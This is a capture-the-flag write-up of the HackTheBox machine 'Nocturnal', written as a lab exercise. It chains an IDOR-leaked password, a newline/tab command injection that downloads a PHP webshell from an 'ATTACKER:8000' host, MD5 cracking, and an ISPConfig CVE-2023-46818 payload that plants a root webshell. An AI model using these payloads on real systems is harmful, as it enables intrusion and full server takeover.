# Nocturnal — HTB write-up

> **HTB · Easy · Linux · retired.** Flags redacted.

Two open ports (22, 80), one web app, and a chain held together by a single
reused password. The teaching points are an IDOR that leaks a credential, a
blacklist that forgets whitespace, and a root-run control panel reachable only
from localhost.

## Recon

```
22/tcp  OpenSSH 8.2p1 Ubuntu
80/tcp  nginx 1.18.0 — 302 → http://nocturnal.htb/
```

The redirect names a vhost. Add `nocturnal.htb` to hosts and the site appears: a
file-sharing app with register, login, and per-user document upload.

## Foothold part 1 — IDOR → leaked password

Registering and uploading a file shows the viewer link:

```
view.php?username=pwnloop&file=test.pdf
```

The `username` is in the URL, not derived from the session. Requesting a
*non-existent* file of a given extension makes `view.php` helpfully list that
user's real files of the same extension:

```
view.php?username=amanda&file=x.pdf
  → Available files for download: privacy.odt
```

Registration doubles as a username oracle ("Failed to register user" = taken),
which surfaces `admin` and `amanda`. Downloading amanda's `privacy.odt`:

> Nocturnal has set the following temporary password for you: **arHkG7HAI68X8s1J**.
> This password has been set for all our services …

The password fails on SSH but logs amanda into the web app — and amanda's
dashboard carries a link the others don't: **Go to Admin Panel**.

## Foothold part 2 — command injection in the backup feature

`admin.php` is a source browser plus a "create backup" form. Reading its own
source (via `admin.php?view=admin.php`) shows the sink:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
proc_open($command, …);
```

`$password` passes through `cleanEntry`, which rejects
`; & | $ (space) ` { }` — but **not newline and not tab**. So a password can end
the `zip` line with a newline and start a new command, using tabs where it needs
spaces. The web box has filtered egress (it reaches an attacker HTTP server on a
high port but not a reverse-shell port), so instead of a callback the payload
downloads a PHP webshell into the webroot and is driven over port 80 — the result
comes back in a response we requested, needing no outbound connection.

```
password = x <LF> curl <TAB> -o <TAB> c.php <TAB> ATTACKER:8000/c.php <LF>
→ GET /c.php?c=id → uid=33(www-data)
```

*(Lesson logged this run: a reverse shell to a port the target can't egress to
hangs on `connect` and ties up PHP-FPM workers — enough of them and the whole web
app stops responding. Characterise egress first, then pick an inbound primitive.)*

## From www-data to tobias

`login.php` shows the backend: SQLite, passwords as **unsalted MD5**.

```
sqlite> SELECT username,password FROM users;
tobias|55c82b1c…07d5061d
```

```
$ john --format=raw-md5 --wordlist=rockyou.txt
slowmotionapocalypse  (tobias)
```

`ssh tobias@target` with that password → **user.txt**.

## Privilege escalation — ISPConfig CVE-2023-46818

`tobias` has no sudo, but local listeners tell the story:

```
127.0.0.1:8080   ISPConfig control panel (runs as root)
127.0.0.1:3306   MySQL
```

The same password logs into ISPConfig as the **admin** superadmin (reuse again).
The install is **3.2.10p1** with `admin_allow_langedit=superadmin` — vulnerable to
**CVE-2023-46818**: the language-file editor writes attacker-controlled array keys
into a PHP file without sanitisation, so

```
records[\] = '];file_put_contents('sh.php',base64_decode('<webshell>'));die;#
```

drops a webshell under `/admin/` that executes as root. From localhost:

```
$ python3 ispc_rce.py id
uid=0(root) gid=0(root) groups=0(root)
$ python3 ispc_rce.py cat /root/root.txt   → root.txt
```

## Dead ends and detours

- **SSH with amanda's leaked password** — failed; the password was web-only. The
  "all our services" wording was a nudge toward *reuse*, not toward SSH directly.
- **Reverse shells** — dead on arrival; egress is filtered to inbound/high-port
  HTTP only. The webshell-over-80 primitive is the intended shape.
- **Reading ISPConfig config as tobias** — permission denied; the version had to
  come from the authenticated panel / post-root read, not the filesystem.

## Takeaways

1. An IDOR is worth as much as whatever the exposed object contains — here, a
   password that unlocked every later stage.
2. A character blacklist that forgets whitespace is not a filter. Newline and tab
   break out of a shell string just as well as `;` and `|`.
3. One password, reused across the web app, the OS, and a root-run panel, is what
   turned a low-value web bug into full root.
